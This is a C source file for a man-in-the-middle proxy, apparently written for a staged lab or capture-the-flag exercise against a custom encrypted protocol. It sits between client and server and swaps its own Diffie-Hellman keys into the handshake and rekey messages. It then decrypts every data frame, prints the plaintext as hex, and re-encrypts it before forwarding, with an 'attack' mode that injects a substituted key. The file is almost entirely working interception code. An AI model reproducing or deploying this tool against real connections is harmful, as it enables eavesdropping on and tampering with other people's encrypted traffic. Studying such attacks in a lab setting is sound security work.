#include "crypto_dh.h"
#include "crypto_gcm.h"
#include "crypto_sha256.h"
#include "net.h"
#include "util.h"

#include <getopt.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

enum {
	MSG_CLIENT_HELLO = 0x01,
	MSG_SERVER_HELLO = 0x02,
	MSG_DATA = 0x10,
	MSG_CTRL = 0x11,
};

enum {
	CTRL_REKEY_INIT = 0x01,
	CTRL_REKEY_REPLY = 0x02,
};

static void u64_be_store(uint8_t out[8], uint64_t v) {
	for (int i = 0; i < 8; i++) {
		out[7 - i] = (uint8_t)(v >> (i * 8));
	}
}

static uint64_t u64_be_load(const uint8_t in[8]) {
	uint64_t v = 0;
	for (int i = 0; i < 8; i++) {
		v = (v << 8) | in[i];
	}
	return v;
}

static void kdf_key(uint8_t out_key[32], const uint8_t shared[32], const uint8_t n1[16], const uint8_t n2[16]) {
	uint8_t buf[32 + 16 + 16];
	memcpy(buf, shared, 32);
	memcpy(buf + 32, n1, 16);
	memcpy(buf + 48, n2, 16);
	crypto_sha256(out_key, buf, sizeof(buf));
}

static uint32_t derive_salt(const uint8_t n1[16], const uint8_t n2[16]) {
	uint8_t buf[32];
	memcpy(buf, n1, 16);
	memcpy(buf + 16, n2, 16);
	uint8_t h[32];
	crypto_sha256(h, buf, sizeof(buf));
	return ((uint32_t)h[0] << 24) | ((uint32_t)h[1] << 16) | ((uint32_t)h[2] << 8) | (uint32_t)h[3];
}

static void dump_hex(const char *prefix, const uint8_t *buf, size_t len) {
	fprintf(stdout, "%s (%zu): ", prefix, len);
	for (size_t i = 0; i < len; i++) {
		fprintf(stdout, "%02x", buf[i]);
	}
	fprintf(stdout, "\n");
	fflush(stdout);
}

struct rekey_pending {
	int active;
	uint8_t n_c[16];
	uint8_t pub_c[32];

	uint8_t priv_to_server[32];
	uint8_t pub_to_server[32];

	uint8_t priv_to_client[32];
	uint8_t pub_to_client[32];
};

struct mitm_ctx {
	uint8_t key_client[32];
	uint8_t key_server[32];
	uint32_t salt;

	int raw_forward;

	int switch_pending;
	uint8_t next_key_client[32];
	uint8_t next_key_server[32];
	uint32_t next_salt;

	uint8_t n_c[16];
	uint8_t n_s[16];

	struct rekey_pending pending;
};

static int relay_raw_one(int from_fd, int to_fd) {
	void *buf = NULL;
	uint32_t len = 0;
	if (net_recv_frame(from_fd, &buf, &len) != 0) {
		return -1;
	}
	int rc = net_send_frame(to_fd, buf, len);
	net_free_frame(buf);
	return rc;
}

static int decrypt_frame(const uint8_t key[32], const uint8_t *frame, uint32_t frame_len, uint8_t *out_type, uint64_t *out_seq,
						 const uint8_t **out_iv, const uint8_t **out_tag, const uint8_t **out_ct, uint32_t *out_ct_len,
						 uint8_t **out_pt) {
	if (frame_len < 1 + 8 + 12 + 16) {
		return -1;
	}
	*out_type = frame[0];
	*out_seq = u64_be_load(&frame[1]);
	*out_iv = &frame[1 + 8];
	*out_tag = &frame[1 + 8 + 12];
	*out_ct = &frame[1 + 8 + 12 + 16];
	*out_ct_len = frame_len - (1 + 8 + 12 + 16);

	uint8_t aad[1 + 8];
	aad[0] = *out_type;
	u64_be_store(&aad[1], *out_seq);

	if (*out_ct_len > 0) {
		*out_pt = (uint8_t *)malloc(*out_ct_len);
		if (!*out_pt) {
			return -1;
		}
	} else {
		*out_pt = NULL;
	}

	if (crypto_aes256_gcm_decrypt(key, *out_iv, aad, sizeof(aad), *out_ct, *out_ct_len, *out_tag, *out_pt) != 0) {
		free(*out_pt);
		*out_pt = NULL;
		return -1;
	}

	return 0;
}

static int encrypt_frame(const uint8_t key[32], uint8_t type, uint64_t seq, const uint8_t iv[12], const uint8_t *pt,
						 uint32_t pt_len, uint8_t **out_frame, uint32_t *out_frame_len) {
	uint8_t aad[1 + 8];
	aad[0] = type;
	u64_be_store(&aad[1], seq);

	uint8_t *ct = NULL;
	if (pt_len > 0) {
		ct = (uint8_t *)malloc(pt_len);
		if (!ct) {
			return -1;
		}
	}

	uint8_t tag[16];
	if (crypto_aes256_gcm_encrypt(key, iv, aad, sizeof(aad), pt, pt_len, ct, tag) != 0) {
		free(ct);
		return -1;
	}

	uint32_t frame_len = 1 + 8 + 12 + 16 + pt_len;
	uint8_t *frame = (uint8_t *)malloc(frame_len);
	if (!frame) {
		free(ct);
		return -1;
	}

	uint32_t off = 0;
	frame[off++] = type;
	u64_be_store(&frame[off], seq);
	off += 8;
	memcpy(&frame[off], iv, 12);
	off += 12;
	memcpy(&frame[off], tag, 16);
	off += 16;
	if (pt_len > 0) {
		memcpy(&frame[off], ct, pt_len);
	}
	free(ct);

	*out_frame = frame;
	*out_frame_len = frame_len;
	return 0;
}

static int handle_ctrl_client_to_server(struct mitm_ctx *ctx, uint8_t *pt, uint32_t pt_len) {
	if (pt_len != (1 + 16 + 32) || pt[0] != CTRL_REKEY_INIT) {
		return 0;
	}

	memcpy(ctx->pending.n_c, &pt[1], 16);
	memcpy(ctx->pending.pub_c, &pt[1 + 16], 32);

	if (crypto_dh_keypair(ctx->pending.priv_to_server, ctx->pending.pub_to_server) != 0) {
		return -1;
	}
	if (crypto_dh_keypair(ctx->pending.priv_to_client, ctx->pending.pub_to_client) != 0) {
		return -1;
	}
	ctx->pending.active = 1;

	memcpy(&pt[1 + 16], ctx->pending.pub_to_server, 32);
	return 0;
}

static int handle_ctrl_server_to_client(struct mitm_ctx *ctx, uint8_t *pt, uint32_t pt_len) {
	if (pt_len != (1 + 16 + 32) || pt[0] != CTRL_REKEY_REPLY) {
		return 0;
	}
	if (!ctx->pending.active) {
		return -1;
	}

	uint8_t n_s2[16];
	uint8_t pub_s2[32];
	memcpy(n_s2, &pt[1], 16);
	memcpy(pub_s2, &pt[1 + 16], 32);

	uint8_t shared_server[32];
	uint8_t shared_client[32];
	crypto_dh_shared(shared_server, ctx->pending.priv_to_server, pub_s2);
	crypto_dh_shared(shared_client, ctx->pending.priv_to_client, ctx->pending.pub_c);

	uint8_t new_key_server[32];
	uint8_t new_key_client[32];
	kdf_key(new_key_server, shared_server, ctx->pending.n_c, n_s2);
	kdf_key(new_key_client, shared_client, ctx->pending.n_c, n_s2);

	memcpy(ctx->next_key_server, new_key_server, 32);
	memcpy(ctx->next_key_client, new_key_client, 32);
	ctx->next_salt = derive_salt(ctx->pending.n_c, n_s2);
	ctx->switch_pending = 1;

	memcpy(&pt[1 + 16], ctx->pending.pub_to_client, 32);
	ctx->pending.active = 0;
	return 0;
}

static int relay_one(struct mitm_ctx *ctx, int from_fd, int to_fd, const uint8_t key_from[32], const uint8_t key_to[32],
					 const char *dir_prefix, int is_c2s) {
	void *buf = NULL;
	uint32_t len = 0;
	if (net_recv_frame(from_fd, &buf, &len) != 0) {
		return -1;
	}

	uint8_t *frame = (uint8_t *)buf;
	uint8_t type = 0;
	uint64_t seq = 0;
	const uint8_t *iv = NULL;
	const uint8_t *tag = NULL;
	const uint8_t *ct = NULL;
	uint32_t ct_len = 0;
	uint8_t *pt = NULL;

	if (decrypt_frame(key_from, frame, len, &type, &seq, &iv, &tag, &ct, &ct_len, &pt) != 0) {
		net_free_frame(buf);
		return -1;
	}

	if (type == MSG_DATA) {
		dump_hex(dir_prefix, pt, ct_len);
	}

	if (type == MSG_CTRL) {
		if (is_c2s) {
			if (handle_ctrl_client_to_server(ctx, pt, ct_len) != 0) {
				free(pt);
				net_free_frame(buf);
				return -1;
			}
		} else {
			if (handle_ctrl_server_to_client(ctx, pt, ct_len) != 0) {
				free(pt);
				net_free_frame(buf);
				return -1;
			}
		}
	}

	int should_switch = (!is_c2s && type == MSG_CTRL && ct_len > 0 && pt[0] == CTRL_REKEY_REPLY && ctx->switch_pending);

	uint8_t *out_frame = NULL;
	uint32_t out_len = 0;
	if (encrypt_frame(key_to, type, seq, iv, pt, ct_len, &out_frame, &out_len) != 0) {
		free(pt);
		net_free_frame(buf);
		return -1;
	}

	free(pt);
	net_free_frame(buf);

	int rc = net_send_frame(to_fd, out_frame, out_len);
	free(out_frame);
	if (rc == 0 && should_switch) {
		memcpy(ctx->key_server, ctx->next_key_server, 32);
		memcpy(ctx->key_client, ctx->next_key_client, 32);
		ctx->salt = ctx->next_salt;
		ctx->switch_pending = 0;
	}
	return rc;
}

enum mode {
	MODE_AUTO = 0,
	MODE_STAGE1 = 1,
	MODE_STAGE3_PASSIVE = 2,
	MODE_STAGE3_ATTACK = 3,
};

static int do_handshake(struct mitm_ctx *ctx, int client_fd, int server_fd, enum mode mode) {
	void *cbuf = NULL;
	uint32_t clen = 0;
	if (net_recv_frame(client_fd, &cbuf, &clen) != 0) {
		return -1;
	}
	if (clen != (1 + 16 + 32)) {
		net_free_frame(cbuf);
		return -1;
	}
	uint8_t *cp = (uint8_t *)cbuf;
	if (cp[0] != MSG_CLIENT_HELLO) {
		net_free_frame(cbuf);
		return -1;
	}
	memcpy(ctx->n_c, &cp[1], 16);
	uint8_t pub_c[32];
	memcpy(pub_c, &cp[1 + 16], 32);

	uint8_t priv_to_server[32];
	uint8_t pub_to_server[32];
	uint8_t priv_to_client[32];
	uint8_t pub_to_client[32];
	int have_mitm_keys = 0;
	if (mode == MODE_AUTO || mode == MODE_STAGE1 || mode == MODE_STAGE3_ATTACK) {
		if (crypto_dh_keypair(priv_to_server, pub_to_server) != 0) {
			net_free_frame(cbuf);
			return -1;
		}
		if (crypto_dh_keypair(priv_to_client, pub_to_client) != 0) {
			net_free_frame(cbuf);
			return -1;
		}
		have_mitm_keys = 1;
	}

	cp[0] = MSG_CLIENT_HELLO;
	if (have_mitm_keys && (mode == MODE_AUTO || mode == MODE_STAGE1 || mode == MODE_STAGE3_ATTACK)) {
		memcpy(&cp[1 + 16], pub_to_server, 32);
	}
	if (net_send_frame(server_fd, cp, clen) != 0) {
		net_free_frame(cbuf);
		return -1;
	}
	net_free_frame(cbuf);

	void *sbuf = NULL;
	uint32_t slen = 0;
	if (net_recv_frame(server_fd, &sbuf, &slen) != 0) {
		return -1;
	}
	uint8_t *sp = (uint8_t *)sbuf;
	if (sp[0] != MSG_SERVER_HELLO) {
		net_free_frame(sbuf);
		return -1;
	}

	if (slen == (1 + 16 + 32 + 32)) {
		if (mode == MODE_STAGE1) {
			net_free_frame(sbuf);
			return -1;
		}
		memcpy(ctx->n_s, &sp[1], 16);
		ctx->raw_forward = 1;

		if (mode == MODE_STAGE3_ATTACK || mode == MODE_AUTO) {
			if (!have_mitm_keys) {
				net_free_frame(sbuf);
				return -1;
			}
			memcpy(&sp[1 + 16], pub_to_client, 32);
			fprintf(stdout, "stage3 attack injected\n");
			fflush(stdout);
		}

		if (net_send_frame(client_fd, sp, slen) != 0) {
			net_free_frame(sbuf);
			return -1;
		}
		net_free_frame(sbuf);
		return 0;
	}

	if (slen != (1 + 16 + 32)) {
		net_free_frame(sbuf);
		return -1;
	}

	if (mode == MODE_STAGE3_PASSIVE || mode == MODE_STAGE3_ATTACK) {
		net_free_frame(sbuf);
		return -1;
	}

	memcpy(ctx->n_s, &sp[1], 16);
	uint8_t pub_s[32];
	memcpy(pub_s, &sp[1 + 16], 32);

	sp[0] = MSG_SERVER_HELLO;
	memcpy(&sp[1 + 16], pub_to_client, 32);
	if (net_send_frame(client_fd, sp, slen) != 0) {
		net_free_frame(sbuf);
		return -1;
	}
	net_free_frame(sbuf);

	uint8_t shared_client[32];
	uint8_t shared_server[32];
	crypto_dh_shared(shared_client, priv_to_client, pub_c);
	crypto_dh_shared(shared_server, priv_to_server, pub_s);
	kdf_key(ctx->key_client, shared_client, ctx->n_c, ctx->n_s);
	kdf_key(ctx->key_server, shared_server, ctx->n_c, ctx->n_s);
	ctx->salt = derive_salt(ctx->n_c, ctx->n_s);
	ctx->pending.active = 0;
	return 0;
}

static void usage(const char *prog) {
	fprintf(stderr,
			"Usage: %s --listen <ip> --lport <port> --target <ip> --tport <port> [--mode auto|stage1|stage3-passive|stage3-attack]\n",
			prog);
}

int main(int argc, char **argv) {
	const char *listen_host = "127.0.0.1";
	uint16_t listen_port = 9001;
	const char *target_host = "127.0.0.1";
	uint16_t target_port = 9000;
	enum mode mode = MODE_AUTO;

	static struct option opts[] = {
		{"listen", required_argument, 0, 'l'},
		{"lport", required_argument, 0, 'L'},
		{"target", required_argument, 0, 't'},
		{"tport", required_argument, 0, 'T'},
		{"mode", required_argument, 0, 'm'},
		{0, 0, 0, 0},
	};

	for (;;) {
		int c = getopt_long(argc, argv, "l:L:t:T:m:", opts, NULL);
		if (c == -1) {
			break;
		}
		switch (c) {
		case 'l':
			listen_host = optarg;
			break;
		case 'L':
			if (util_parse_u16(optarg, &listen_port) != 0) {
				usage(argv[0]);
				return 2;
			}
			break;
		case 't':
			target_host = optarg;
			break;
		case 'T':
			if (util_parse_u16(optarg, &target_port) != 0) {
				usage(argv[0]);
				return 2;
			}
			break;
		case 'm':
			if (strcmp(optarg, "auto") == 0) {
				mode = MODE_AUTO;
			} else if (strcmp(optarg, "stage1") == 0) {
				mode = MODE_STAGE1;
			} else if (strcmp(optarg, "stage3-passive") == 0) {
				mode = MODE_STAGE3_PASSIVE;
			} else if (strcmp(optarg, "stage3-attack") == 0) {
				mode = MODE_STAGE3_ATTACK;
			} else {
				usage(argv[0]);
				return 2;
			}
			break;
		default:
			usage(argv[0]);
			return 2;
		}
	}

	signal(SIGPIPE, SIG_IGN);

	int listen_fd = net_listen_tcp(listen_host, listen_port, 128);
	if (listen_fd < 0) {
		perror("listen");
		return 1;
	}

	for (;;) {
		int client_fd = net_accept(listen_fd);
		if (client_fd < 0) {
			continue;
		}
		int server_fd = net_connect_tcp(target_host, target_port);
		if (server_fd < 0) {
			close(client_fd);
			continue;
		}

		struct mitm_ctx ctx;
		memset(&ctx, 0, sizeof(ctx));
		if (do_handshake(&ctx, client_fd, server_fd, mode) != 0) {
			close(client_fd);
			close(server_fd);
			continue;
		}

		struct pollfd pfds[2];
		pfds[0].fd = client_fd;
		pfds[0].events = POLLIN;
		pfds[1].fd = server_fd;
		pfds[1].events = POLLIN;

		for (;;) {
			int rc = poll(pfds, 2, -1);
			if (rc <= 0) {
				break;
			}
			if (pfds[0].revents & POLLIN) {
				if (ctx.raw_forward) {
					if (relay_raw_one(client_fd, server_fd) != 0) {
						break;
					}
				} else {
					if (relay_one(&ctx, client_fd, server_fd, ctx.key_client, ctx.key_server, "C->S", 1) != 0) {
						break;
					}
				}
			}
			if (pfds[1].revents & POLLIN) {
				if (ctx.raw_forward) {
					if (relay_raw_one(server_fd, client_fd) != 0) {
						break;
					}
				} else {
					if (relay_one(&ctx, server_fd, client_fd, ctx.key_server, ctx.key_client, "S->C", 0) != 0) {
						break;
					}
				}
			}
		}

		close(client_fd);
		close(server_fd);
	}

	return 0;
}
